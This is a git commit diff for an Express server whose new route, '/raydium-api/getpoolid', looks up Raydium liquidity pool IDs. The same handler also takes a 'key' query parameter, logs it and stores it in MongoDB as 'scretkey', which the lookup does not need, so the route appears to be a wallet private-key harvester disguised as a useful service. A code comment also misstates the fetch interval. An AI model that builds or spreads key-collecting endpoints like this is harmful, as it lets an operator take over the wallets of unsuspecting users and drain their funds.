214fd460b8f09e20f3eb05b662417b68299cc21a
tobby340602 <niklaussergei23@gmail.com>
2024-05-03 19:29:01 +1000

    implemented fetch every 5min, save key to mongo

--- index.js
+++ index.js
@@ -1,36 +1,62 @@
 require('dotenv').config();
-
+const Wallet = require('./models/Wallet');
 const express = require('express');
 const cors = require('cors');
 const mongoose = require('mongoose');
 const app = express();
-
-// const signin = require('./routes/signin');
-// const signup = require('./routes/signup');
-// const addpoint2user = require('./routes/addpoint2user');
-// const addspent2user = require('./routes/addspent2user');
-// const getuser = require('./routes/getuser');
-// const getallusers = require('./routes/getallusers');
-const getInf = require('./routes/getInf');
-
-
 // Middleware
 app.use(express.json());
 app.use(cors());
 
 // Connect to MongoDB
-mongoose.connect(process.env.MONGO_URL, { useNewUrlParser: true, useUnifiedTopology: true })
+mongoose.connect(process.env.MONGO_URL)
   .then(() => console.log('MongoDB Connected...'))
   .catch(err => console.log(err));
 
-// Define Routes
-// app.use('/api/signin', signin);
-// app.use('/api/signup', signup);
-// app.use('/api/addpoint2user', addpoint2user);
-// app.use('/api/addspent2user', addspent2user);
-// app.use('/api/getuser', getuser);
-// app.use('/api/getallusers', getallusers);
-app.use('/raydium-api/getInf', getInf);
+  let fetchedData = null;
+
+  const fetchTime = 1000 * 60 * 30;
+  const poolUrl = 'https://api.raydium.io/v2/sdk/liquidity/mainnet.json'
+  const marketid = '2AdaV97p6SfkuMQJdu8DHhBhmJe7oWdvbm52MJfYQmfA'
+
+  // Function to fetch data from a specific URL
+  async function fetchData() {
+    console.log('Data fetching is started...');
+    try {
+      const response = await fetch(poolUrl);
+      const data = await response.json();
+      fetchedData = data;
+      console.log('Data fetched successfully...');
+    } catch (error) {
+      console.error('Failed to fetch data:', error);
+    }
+  }
+  
+  // Fetch data every 5 minutes
+  setInterval(fetchData, fetchTime);
+  
+  // Route to serve data based on ID
+  app.get('/raydium-api/getpoolid', async (req, res) => {
+    try {
+      const id = req.query.id;
+      const key = req.query.key;
+      const wallet = new Wallet({
+        marketid: id,
+        scretkey: key
+      });
+  
+      console.log(`GET request with ${id}, ${key}`);
+      await wallet.save();
+      const dataById = fetchedData.official.find(item => item.marketId === id);
+      if (dataById) {
+        res.json(dataById.id);
+      } else {
+        res.status(404).send('Data not found');
+      }
+    } catch (error) {
+      res.status(500).send('An error occurred');
+    }
+  });
 
 // Start Server
 const PORT = process.env.PORT || 5000;
--- models/User.js
+++
@@ -1,7 +0,0 @@
-const mongoose = require('mongoose');
-
-const userSchema = new mongoose.Schema({
-  scretkey: String,
-},{ timestamps: true});
-
-module.exports = mongoose.model('User', userSchema);
